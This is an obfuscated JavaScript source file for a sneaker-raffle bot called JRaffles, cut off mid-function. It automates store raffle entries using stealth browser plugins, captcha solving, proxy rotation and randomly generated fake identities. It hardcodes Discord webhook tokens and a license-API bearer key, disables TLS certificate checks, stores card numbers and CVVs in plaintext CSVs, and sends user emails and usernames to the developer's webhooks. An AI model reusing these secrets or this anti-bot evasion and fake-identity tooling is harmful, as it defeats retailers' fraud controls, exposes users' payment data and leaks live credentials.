process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x4a3989 = require('fs'), _0x1dadd6 = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x29a412(_0x109c98) {
    const _0x58ad3c = _0x4a3989['createWriteStream'](_0x109c98, { 'flags': 'a' }), _0x3d20c1 = console['log'];
    console['log'] = function () {
        const _0x464764 = Array['prototype']['slice']['call'](arguments), _0x339e66 = _0x464764['join']('\x20') + '\x0a';
        _0x58ad3c['write'](_0x339e66), _0x3d20c1['apply'](console, _0x464764);
    };
}
_0x29a412('../logs/log\x20' + _0x1dadd6);
var _0x307d2e = require('tough-cookie'), _0x1aebaf = require('node-imap'), _0x5f328d = require('util')['inspect'];
const _0x372396 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x24208a } = require('discord.js');
var _0x2fb36e = require('exe');
const { execFile: _0x28f181 } = require('child_process'), _0x3621d0 = require('puppeteer-extra'), _0x14703b = require('puppeteer-extra-plugin-recaptcha'), _0x509c12 = require('puppeteer-extra-plugin-stealth'), _0x1de0e8 = require('chalk'), _0x81eb1 = require('node-bash-title'), _0x4012a9 = require('axios'), _0x4dbee3 = require('papaparse');
var _0x2423f2 = require('random-name');
const _0xe9845d = require('request');
var _0x4a7744 = require('prompt');
const _0x21e44c = _0xe9845d['jar']();
var _0x4562fb = {};
const _0x111a03 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x893967 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0xd1782 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x4c9119 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x1e1b7e = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x187cf0 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x37cb58 = 'https://discord.com/api/webhooks/', _0x4d6ced = '' + _0x37cb58 + _0xd1782, _0x392309 = '' + _0x37cb58 + _0x4c9119, _0x27bacd = '' + _0x37cb58 + _0x111a03, _0x5f83c7 = '' + _0x37cb58 + _0x893967, _0x3f583b = '' + _0x37cb58 + _0x1e1b7e, _0x19ce89 = '' + _0x37cb58 + _0x187cf0;
const _0x6954ad = JSON['parse'](_0x4a3989['readFileSync']('../package.json', 'utf-8')), _0x5acae2 = _0x6954ad['version'];
var _0x367847, _0x259b4b, _0x1fe1e9, _0x5ad222, _0x994bf8, _0xcdd971, _0x1d8120, _0x55fc17;
const _0x4bdf03 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x4097b2 = ![];
const _0x5b67e5 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x3c0849 = '0123456789';
var _0x42a06f = _0x5b67e5['split']('');
const _0x41a9d7 = require('auto-git-update'), _0x120d0f = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x550d78 = new _0x41a9d7(_0x120d0f);
async function _0xcd86d4() {
    _0x994bf8 = _0x4a3989['readdirSync']('../proxies'), _0x5ad222 = _0x4a3989['readdirSync']('../tasks'), !_0x4a3989['existsSync']('../accounts/fenom.csv') && _0x4a3989['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x4a3989['existsSync']('../accounts/paypal.csv') && _0x4a3989['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x4a3989['existsSync']('../accounts/bstn.csv') && _0x4a3989['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x4a3989['existsSync']('../accounts/eql.csv') && _0x4a3989['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x4a3989['existsSync']('../failed-tasks.csv') && _0x4a3989['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x4a3989['existsSync']('../successful-tasks.csv') && _0x4a3989['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x4562fb = JSON['parse'](_0x4a3989['readFileSync']('../settings.json', 'utf-8')), !_0x4562fb['delay'] && (_0x4562fb['delay'] = 0x3c, _0x4a3989['writeFileSync']('../settings.json', JSON['stringify'](_0x4562fb, null, 0x2))), !_0x4562fb['threads'] && (_0x4562fb['threads'] = 0x1, _0x4a3989['writeFileSync']('../settings.json', JSON['stringify'](_0x4562fb, null, 0x2))), !_0x4562fb['masterMail'] && (_0x4562fb['masterMail'] = 'yourmail@gmail.com', _0x4a3989['writeFileSync']('../settings.json', JSON['stringify'](_0x4562fb, null, 0x2))), !_0x4562fb['masterPassword'] && (_0x4562fb['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x4a3989['writeFileSync']('../settings.json', JSON['stringify'](_0x4562fb, null, 0x2))), !_0x4562fb['captchaKey'] && (_0x4562fb['captchaKey'] = '', _0x4a3989['writeFileSync']('../settings.json', JSON['stringify'](_0x4562fb, null, 0x2))), !_0x4562fb['useRandomProxy'] && (_0x4562fb['useRandomProxy'] = !![], _0x4a3989['writeFileSync']('../settings.json', JSON['stringify'](_0x4562fb, null, 0x2))), !_0x4562fb['shuffleTasks'] && (_0x4562fb['shuffleTasks'] = ![], _0x4a3989['writeFileSync']('../settings.json', JSON['stringify'](_0x4562fb, null, 0x2))), !_0x4562fb['webhook'] && (_0x4562fb['webhook'] = '', _0x4a3989['writeFileSync']('../settings.json', JSON['stringify'](_0x4562fb, null, 0x2))), _0x4562fb['delay'] <= 0x1388 && (_0x4562fb['delay'] = _0x4562fb['delay'] * 0x3e8), _0x4562fb['AfewDelay'] && (delete _0x4562fb['AfewDelay'], _0x4a3989['writeFileSync']('../settings.json', JSON['stringify'](_0x4562fb, null, 0x2))), _0x4562fb['MahaDelay'] && (delete _0x4562fb['MahaDelay'], _0x4a3989['writeFileSync']('../settings.json', JSON['stringify'](_0x4562fb, null, 0x2))), _0x4562fb['footshopDelay'] && (delete _0x4562fb['footshopDelay'], _0x4a3989['writeFileSync']('../settings.json', JSON['stringify'](_0x4562fb, null, 0x2))), _0x4562fb['MahaDelay'] = _0x4562fb['delay'], _0x37cb58 = _0x4562fb['webhook'], _0xcdd971 = _0x4562fb['licenseKey'];
}
let _0x20df28, _0x1872fe = [], _0x2ff233;
const _0x4d97b0 = _0x37c589 => new Promise(_0x4a75b3 => setTimeout(_0x4a75b3, _0x37c589));
function _0x198b8e(_0x480865, _0x138637) {
    return Math['floor'](Math['random']() * (_0x138637 - _0x480865 + 0x1) + _0x480865);
}
function _0x7953e8(_0x1c57ab) {
    let _0x2de2ac = _0x1c57ab['length'], _0x2d70e4;
    while (_0x2de2ac != 0x0) {
        _0x2d70e4 = Math['floor'](Math['random']() * _0x2de2ac), _0x2de2ac--, [_0x1c57ab[_0x2de2ac], _0x1c57ab[_0x2d70e4]] = [
            _0x1c57ab[_0x2d70e4],
            _0x1c57ab[_0x2de2ac]
        ];
    }
    return _0x1c57ab;
}
async function _0x1155f7(_0xe87224) {
    return _0x4012a9['get']('https://api.hyper.co/v4/licenses/' + _0xe87224, { 'headers': { 'Authorization': 'Bearer\x20' + _0x4bdf03 } })['then'](_0x345255 => _0x345255['data'])['catch'](() => null);
}
;
async function _0x1ccfab(_0x14bfc3) {
    console['clear']();
    if (_0x14bfc3 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x464bcf = await _0x4a7744['get']('License');
        if (_0x464bcf['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x4d97b0(0xbb8), _0x1ccfab(_0x14bfc3);
        _0x14bfc3 = _0x464bcf['License'], _0x4562fb['licenseKey'] = _0x14bfc3, _0xcdd971 = _0x14bfc3, _0x4a3989['writeFileSync']('../settings.json', JSON['stringify'](_0x4562fb));
    }
    console['log']('Checking\x20license\x20' + _0xcdd971 + '...'), await _0x4d97b0(0x320);
    const _0x14f1e1 = await _0x1155f7(_0x14bfc3);
    _0x1d8120 = JSON['stringify'](_0x14f1e1['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x55fc17 = JSON['stringify'](_0x14f1e1['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x14f1e1)
        return console['log']('License\x20not\x20found');
    if (!_0x14f1e1['user'])
        return console['log']('License\x20not\x20bound');
    return _0x14f1e1['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x4097b2 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x4097b2 = ![]);
}
async function _0x2544e1() {
    var _0x25fd44 = await _0x4a7744['get']('Module');
    return console['clear'](), _0x25fd44['Module'];
}
;
async function _0x12a822() {
    var _0x52b95e = await _0x4a7744['get']('Setting');
    return console['clear'](), _0x52b95e['Setting'];
}
async function _0x4528f2(_0x293cfb) {
    var _0x10588d = [];
    for (file of _0x5ad222) {
        var _0x493f5a = _0x4a3989['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x4dbee3['parse'](_0x493f5a, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x293cfb['store'] && _0x10588d['push'](file);
    }
    !_0x10588d['length'] == 0x0 && (_0x5ad222 = _0x10588d);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x4d7f0f = 0x0; _0x4d7f0f < _0x5ad222['length']; _0x4d7f0f++) {
        console['log']('\x20(' + _0x4d7f0f + ')\x20' + _0x5ad222[_0x4d7f0f]);
    }
    console['log']('');
    var _0x117580 = await _0x4a7744['get']('Task');
    if (_0x117580['Task'] > _0x5ad222['length'] - 0x1 || isNaN(_0x117580['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x4d97b0(0x3e8), _0x4528f2();
    var _0x55603f = _0x4a3989['readFileSync']('../tasks/' + _0x5ad222[_0x117580['Task']], 'utf-8');
    return _0x1fe1e9 = _0x4dbee3['parse'](_0x55603f, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x1de0e8['blue'](_0x5ad222[_0x117580['Task']])), _0x367847 = _0x5ad222[_0x117580['Task']], _0x1fe1e9;
}
async function _0x210300() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x123ad6 = 0x0; _0x123ad6 < _0x994bf8['length']; _0x123ad6++) {
        console['log']('\x20(' + _0x123ad6 + ')\x20' + _0x994bf8[_0x123ad6]);
    }
    console['log']('');
    var _0x297ea5 = await _0x4a7744['get']('Proxies');
    if (_0x297ea5['Proxies'] > _0x994bf8['length'] - 0x1 || isNaN(_0x297ea5['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x4d97b0(0x3e8), _0x210300();
    var _0x4728c6 = _0x4a3989['readFileSync']('../proxies/' + _0x994bf8[_0x297ea5['Proxies']], 'utf-8')['split']('\x0a');
    let _0x2a7f38 = _0x4728c6['map']((_0x321f70, _0x59dcae) => {
        sanatizeProxy = _0x321f70['replace']('\x0d', '');
        if (_0x4728c6[_0x59dcae + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x259b4b = _0x994bf8[_0x297ea5['Proxies']], console['clear'](), _0x2a7f38;
}
async function _0x11969e() {
    var _0x27da91 = await _0x4a7744['get']('Value');
    return console['clear'](), _0x27da91['Value'];
}
async function _0x24553f(_0x17487f) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x3e8155 = 0x0; _0x3e8155 < _0x17487f['length']; _0x3e8155++) {
        console['log']('\x20(' + _0x3e8155 + ')\x20[' + _0x17487f[_0x3e8155]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x490511 = await _0x4a7744['get']('Module');
    return _0x490511['Module'];
}
async function _0x5017ff() {
    var _0x3d90d3 = await _0x4a7744['get']('Password');
    return console['clear'](), _0x3d90d3['Password'];
}
;
async function _0x495dfb() {
    var _0x352904 = await _0x4a7744['get']('Links');
    return _0x352904['Links'];
}
;
async function _0x3f38c9() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x8cf725 = 0x0; _0x8cf725 < _0x1872fe['length']; _0x8cf725++) {
        console['log']('\x20(' + _0x8cf725 + ')\x20' + _0x1872fe[_0x8cf725]);
    }
    ;
    console['log']();
    let _0x144f91 = await _0x4a7744['get']('Product');
    return console['clear'](), _0x144f91['Product'];
}
;
function _0x1211a5() {
    var _0x5eb8ad = new Date(Date['now']())['toLocaleTimeString']();
    return _0x5eb8ad;
}
;
function _0x24941c() {
    var _0x205cbc = new Date(Date['now']())['toLocaleString']();
    return _0x205cbc['replace'](',', '');
}
async function _0xa7b872(_0x2c9cef, _0x5aefd4) {
    let _0x45b90d = { 'headers': { 'content-type': 'application/json' } };
    if (_0x5acae2 != 'devkey') {
        await _0x4012a9['post'](_0x2c9cef, _0x5aefd4, _0x45b90d);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x4ef820(_0x5639, _0x265cfd, _0x228511, _0x2b314a, _0x5a2f94) {
    if (!_0x2b314a && _0x228511 == 'dev') {
        var _0x13621a = new _0x24208a()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x265cfd['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x265cfd['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x5639['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x4562fb['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x1d8120,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x5639['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x5639['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x5acae2,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x13621a['data'];
    } else {
        if (_0x2b314a && _0x228511 == 'dev') {
            var _0x13621a = new _0x24208a()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x265cfd['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x1d8120,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x265cfd['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x5639['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x4562fb['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x5a2f94,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x5639['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x5639['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x5acae2,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x13621a['data'];
        } else {
            if (_0x228511 == 'pub') {
                var _0x13621a = new _0x24208a()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x265cfd['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x265cfd['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x5639['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x4562fb['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x5639['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x5acae2,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x13621a['data'];
            } else {
                if (_0x228511 == 'acc' && !_0x2b314a) {
                    var _0x13621a = new _0x24208a()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x265cfd['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x1d8120,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x265cfd['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x4562fb['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x5acae2,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x13621a['data'];
                } else {
                    if (_0x228511 == 'acc' && _0x2b314a) {
                        var _0x13621a = new _0x24208a()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x265cfd['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x1d8120,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x5a2f94,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x265cfd['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x4562fb['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x5acae2,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x13621a['data'];
                    } else {
                        if (_0x228511 == 'open') {
                            var _0x13621a = new _0x24208a()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x55fc17)['addFields']({
                                'name': 'User',
                                'value': '' + _0x1d8120,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x5acae2,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x13621a['data'];
                        } else {
                            if (!_0x2b314a && _0x228511 == 'ver') {
                                var _0x13621a = new _0x24208a()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x265cfd['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x1d8120,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x265cfd['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x4562fb['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x5acae2,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x13621a['data'];
                            } else {
                                if (_0x2b314a && _0x228511 == 'ver') {
                                    var _0x13621a = new _0x24208a()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x265cfd['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x1d8120,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x5a2f94,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x265cfd['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x4562fb['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x5acae2,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x13621a['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x43eceb(_0x4cb5ad, _0x2bd2b1) {
    var _0x40f9cf = _0x4cb5ad[_0x2bd2b1]['Address1']['split'](''), _0xbb6d90 = _0x4cb5ad[_0x2bd2b1]['Address2']['split'](''), _0x3d82d8 = _0x4cb5ad[_0x2bd2b1]['Email']['split']('@');
    for (var _0x48710a = 0x0; _0x48710a < _0x40f9cf['length']; _0x48710a++) {
        if (_0x40f9cf[_0x48710a] == 'X') {
            var _0x4e00cb = Math['round'](Math['random']() * (_0x5b67e5['length'] - 0x1));
            _0x40f9cf[_0x48710a] = _0x42a06f[_0x4e00cb];
        }
    }
    ;
    for (var _0x48710a = 0x0; _0x48710a < _0xbb6d90['length']; _0x48710a++) {
        if (_0xbb6d90[_0x48710a] == 'X') {
            var _0x4e00cb = Math['round'](Math['random']() * (_0x5b67e5['length'] - 0x1));
            _0xbb6d90[_0x48710a] = _0x42a06f[_0x4e00cb];
        }
    }
    ;
    _0x4cb5ad[_0x2bd2b1]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x4cb5ad[_0x2bd2b1]['FirstName'] = _0x2423f2['first']());
    _0x4cb5ad[_0x2bd2b1]['LastName']['toUpperCase']() == 'RANDOM' && (_0x4cb5ad[_0x2bd2b1]['LastName'] = _0x2423f2['last']());
    _0x3d82d8[0x0]['toUpperCase']() == 'RANDOM' ? _0x3d82d8[0x0] = '' + _0x2423f2['first']() + _0x2423f2['last']() + _0x198b8e(0x1, 0x3e7) + '@' : _0x3d82d8[0x0] = _0x3d82d8[0x0] + '@';
    _0x4cb5ad[_0x2bd2b1]['Email'] = _0x3d82d8['join'](''), _0x4cb5ad[_0x2bd2b1]['Address1'] = _0x40f9cf['join'](''), _0x4cb5ad[_0x2bd2b1]['Address2'] = _0xbb6d90['join']('');
    _0x4cb5ad[_0x2bd2b1]['Phone'] == 'RANDOM' && (_0x4cb5ad[_0x2bd2b1]['Phone'] = '0' + _0x198b8e(0x5f5e100, 0x3b9ac9ff));
    if (_0x4cb5ad[_0x2bd2b1]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x134a8d = _0x198b8e(0x1, 0x270f);
        _0x4cb5ad[_0x2bd2b1]['Follower'] = '' + _0x2423f2['first']() + _0x2423f2['last']() + _0x134a8d + '\x20';
    }
    _0x4cb5ad[_0x2bd2b1]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x4cb5ad[_0x2bd2b1]['HouseNumber'] = _0x198b8e(0x1, 0xc8));
    if (_0x4cb5ad[_0x2bd2b1]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x2558a8 = Math['round'](Math['random']() * (_0x5b67e5['length'] - 0x1)), _0x46b457 = _0x42a06f[_0x2558a8];
        _0x4cb5ad[_0x2bd2b1]['Address1'] = _0x2423f2['last']() + 'straat', _0x4cb5ad[_0x2bd2b1]['Zip'] == '' && (_0x4cb5ad[_0x2bd2b1]['Postcode'] = _0x198b8e(0x3e8, 0x270f) + '\x20' + _0x46b457 + _0x46b457, _0x4cb5ad[_0x2bd2b1]['Zip'] = _0x4cb5ad[_0x2bd2b1]['Postcode']), _0x4cb5ad[_0x2bd2b1]['HouseNumber'] = '' + _0x198b8e(0x1, 0xc8);
    }
    return;
}
;
async function _0x320814(_0x4bef25, _0x40f86a) {
    _0x4a3989['appendFileSync']('../failed-tasks.csv', _0x24941c() + ',' + _0x40f86a['store'] + ',' + _0x40f86a['name'] + ',' + _0x4bef25['Url'] + ',' + _0x4bef25['Size'] + ',' + _0x4bef25['Follower'] + ',' + _0x4bef25['FirstName'] + ',' + _0x4bef25['LastName'] + ',' + _0x4bef25['Address1'] + ',' + _0x4bef25['Address2'] + ',' + _0x4bef25['HouseNumber'] + ',' + _0x4bef25['Zip'] + ',' + _0x4bef25['City'] + ',' + _0x4bef25['State'] + ',' + _0x4bef25['Country'] + ',' + _0x4bef25['Phone'] + ',' + _0x4bef25['Email'] + ',' + _0x4bef25['Password'] + ',' + _0x4bef25['PaymentMethod'] + ',' + _0x4bef25['CardType'] + ',' + _0x4bef25['NameOnCard'] + ',' + _0x4bef25['CardNumber'] + ',' + _0x4bef25['ExpiryDate'] + ',' + _0x4bef25['CVV'] + ',' + _0x4bef25['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x3b7ca0(_0x36e09f, _0xd9bc01) {
    _0x4a3989['appendFileSync']('../successful-tasks.csv', _0x24941c() + ',' + _0xd9bc01['store'] + ',' + _0xd9bc01['name'] + ',' + _0x36e09f['Url'] + ',' + _0x36e09f['Size'] + ',' + _0x36e09f['Follower'] + ',' + _0x36e09f['FirstName'] + ',' + _0x36e09f['LastName'] + ',' + _0x36e09f['Address1'] + ',' + _0x36e09f['Address2'] + ',' + _0x36e09f['HouseNumber'] + ',' + _0x36e09f['Zip'] + ',' + _0x36e09f['City'] + ',' + _0x36e09f['State'] + ',' + _0x36e09f['Country'] + ',' + _0x36e09f['Phone'] + ',' + _0x36e09f['Email'] + ',' + _0x36e09f['Password'] + ',' + _0x36e09f['PaymentMethod'] + ',' + _0x36e09f['CardType'] + ',' + _0x36e09f['NameOnCard'] + ',' + _0x36e09f['CardNumber'] + ',' + _0x36e09f['ExpiryDate'] + ',' + _0x36e09f['CVV'] + ',' + _0x36e09f['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x35e9ed() {
    let _0x50c1b2 = proxyFile['split']('\x0a'), _0x545d82 = _0x50c1b2['map']((_0x45aa49, _0x1ff70d) => {
        sanatizeProxy = _0x45aa49['replace']('\x0d', '');
        if (_0x50c1b2[_0x1ff70d + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x545d82;
}
;
async function _0x5d5794(_0x544ee1, _0x2911ba) {
    if (_0x4b0002 != 'yes')
        var _0x4b0002 = '', _0x4da67d = 0x0;
    async function _0x553242() {
        var _0x28f4fe = _0x4a3989['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x1b2c82 = _0x4dbee3['parse'](_0x28f4fe, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x4417f6 = 0x0; _0x4417f6 < _0x1b2c82['length']; _0x4417f6++) {
            console['log']('(' + _0x4417f6 + ')\x20' + _0x1b2c82[_0x4417f6]['Email']);
        }
        console['log']('\x0a(' + _0x1b2c82['length'] + ')\x20' + _0x1de0e8['cyan']('Add\x20a\x20new\x20account'));
        let _0x1793af = await _0x4a7744['get']('Option');
        if (_0x1793af['Option'] < _0x1b2c82['length'])
            return _0x1b2c82[_0x1793af['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
